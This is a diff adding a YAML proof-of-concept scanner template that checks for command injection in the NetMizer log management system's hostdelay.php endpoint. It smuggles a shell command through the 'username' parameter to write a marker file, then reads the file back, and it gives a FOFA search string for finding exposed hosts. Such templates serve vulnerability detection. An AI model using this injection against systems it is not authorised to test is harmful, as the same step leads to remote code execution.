@@ -1,0 +1,19 @@
+id: poc-yaml-netmizer-hostdelay-rce
+info:
+  name: NetMizer 日志管理系统 hostdelay命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: NetMizer日志管理系统
+  fofa: title="NetMizer 日志管理系统"
+variables:
+  filename: to_lower(random_str(10))
+requests:
+- method: GET
+  path: /data/hostdelay/hostdelay.php?action=list&username=|echo%20"helloworld">{{.filename}}.txt
+  expression: "status_code == 200 && \ncontains(find_json(body,\"success\"), \"true\"\
+    )\n"
+- method: GET
+  path: /data/hostdelay/{{.filename}}.txt
+  expression: "status_code == 200 && \ntrim(body) == \"helloworld\"\n"
+transport: http
